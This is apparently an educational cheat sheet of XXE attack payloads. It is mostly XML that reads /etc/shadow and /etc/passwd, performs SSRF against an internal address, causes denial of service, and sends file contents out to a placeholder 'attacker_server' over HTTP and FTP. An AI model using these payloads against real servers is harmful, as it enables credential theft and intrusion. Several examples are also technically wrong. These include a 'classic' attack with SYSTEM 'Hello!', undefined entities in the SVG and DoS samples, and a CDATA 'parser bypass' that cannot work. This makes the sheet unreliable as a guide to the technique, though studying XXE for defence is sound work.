**XML and XXE Attack Basics**
- XML documents can use external entities to access local or remote content through URLs. When an entity is preceded by a SYSTEM keyword, it is an external entity.

**Example of Including a Local File**
- In this example, an external entity named "file" is declared with the value from "file:///example.txt" on the local filesystem:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///example.txt">
]>
<example>&file;</example>
```

**Opening `/etc/shadow` File on the Server**
- An example where an attacker attempts to open the `/etc/shadow` file on the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///etc/shadow">
]>
<example>&file;</example>
```

**Classic XXE Attack**
- A classic XXE attack example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "Hello!">
]>
<example>&test;</example>
```

**XXE via XInclude**
- An example of exploiting XXE using XInclude:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Outbound XXE**
- An example of an XXE payload that sends data to an attacker's server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
]>
```

**Embedding XXE in Image (SVG)**
- An example of embedding XXE in an SVG image:

```xml
<svg width="500" height="500">
  <circle cx="50" cy="50" r="40" fill="blue" />
  <text font-size="16" x="0" y="16">&test;</text>
</svg>
```

**XInclude Attacks**
- In cases where you can control one entity but not the whole document, you can use XInclude attacks:

```xml
<example xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</example>
```

**Launching SSRF via XXE**
- Examples of launching SSRF via XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "http://10.0.0.1:80">
]>
<example>&file;</example>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///etc/shadow">
  <!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">
]>
<example>&exfiltrate;</example>
```

**DOS with XXE**
- An example of performing a denial of service (DOS) attack using XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ELEMENT example ANY>
  <!ENTITY lol "lol">
  <!-- Define multiple entities to create a DOS -->
]>
<example>&lol9;</example>
```

**Bypassing Hardened XML Parsers**
- A way to bypass XML parsers that are hardened:

```xml
<!ENTITY % file SYSTEM "file:///passwords.xml">
<![CDATA[%file;]]>
```

**Using PHP URL Wrapper**
- An example of using the PHP URL wrapper to exfiltrate data:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
<![CDATA[%file;]]>
```

**Exfiltrating Using FTP Server**
- An example of exfiltrating data using an FTP server:

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://attacker_server:2121/?%file;'>">
<![CDATA[%ent;]]>
```

Please note that these are examples for educational purposes and should not be used for malicious activities. Always adhere to responsible disclosure practices.
